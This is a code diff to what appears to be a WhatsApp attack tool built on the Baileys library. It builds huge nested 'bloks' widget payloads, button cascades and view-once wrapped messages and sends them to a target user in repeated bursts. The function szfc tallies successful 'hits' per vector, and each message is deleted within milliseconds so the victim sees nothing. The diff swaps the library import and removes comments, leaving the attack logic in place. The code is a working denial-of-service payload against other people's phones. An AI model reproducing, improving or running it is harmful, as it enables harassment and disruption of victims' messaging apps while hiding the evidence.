@@ -8,7 +8,7 @@
 const {
     generateWAMessageFromContent,
     delay,
-} = require('@sakataoffc/baileys');
+} = require('@whiskeysockets/baileys');
 
 // ---------- core payload ----------
 function buildBloksPayload(intensity = 1) {
@@ -58,7 +58,6 @@ async function sendInvisible(client, targetJid, content, opts = {}) {
         return { ok: false, err: err.message };
     }
 
-    // instant revoke — 50-80ms
     if (opts.revoke !== false && key) {
         setTimeout(() => {
             client.sendMessage(targetJid, { delete: key }).catch(() => {});
@@ -109,7 +108,7 @@ async function enableDisappearing(client, seconds = 1) {
     return false;
 }
 
-// ---------- variant: nested bloks (deeper recursion) ----------
+// ---------- variant: nested bloks ----------
 function buildNestedBloks(intensity = 1) {
     const N = 30000 * intensity;
 
@@ -122,7 +121,6 @@ function buildNestedBloks(intensity = 1) {
         },
     };
 
-    // Nest 4 levels deep
     for (let i = 0; i < 4; i++) {
         inner = {
             bloksWidget: {
@@ -244,22 +242,18 @@ async function szfc(client, targetJid, options = {}) {
     };
 
     for (let b = 0; b < bursts; b++) {
-        // Main vector
         const r1 = await sendInvisible(client, sendJid, buildBloksPayload(intensity));
         report.hits.bloks_main = (report.hits.bloks_main || 0) + (r1.ok ? 1 : 0);
         await delay(150);
 
-        // Nested recursion variant
         const r2 = await sendInvisible(client, sendJid, buildNestedBloks(intensity));
         report.hits.bloks_nested = (report.hits.bloks_nested || 0) + (r2.ok ? 1 : 0);
         await delay(150);
 
-        // Button cascade
         const r3 = await sendInvisible(client, sendJid, buildButtonCascade(intensity));
         report.hits.button_cascade = (report.hits.button_cascade || 0) + (r3.ok ? 1 : 0);
         await delay(150);
 
-        // View-once wrapped
         const r4 = await sendInvisible(client, sendJid, buildViewOnceBloks(intensity));
         report.hits.viewonce_bloks = (report.hits.viewonce_bloks || 0) + (r4.ok ? 1 : 0);
 
